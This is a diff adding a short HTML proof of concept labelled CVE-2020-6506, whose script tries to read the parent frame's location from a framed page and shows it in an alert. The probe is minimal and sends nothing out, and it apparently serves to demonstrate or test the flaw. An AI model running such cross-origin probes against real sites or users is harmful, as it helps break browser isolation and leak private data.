@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CVE-2020-6506 PoC</title>
+</head>
+<body>
+  <h1>CVE-2020-6506 PoC</h1>
+  <script>
+    // Attempt to access the parent frame's DOM
+    var parentFrame = window.parent;
+    if (parentFrame) {
+      // Try to access a sensitive property (e.g., location.href)
+      var parentLocation = parentFrame.location.href;
+      alert("Parent frame location: " + parentLocation);
+    } else {
+      alert("No parent frame found");
+    }
+  </script>
+</body>
+</html>
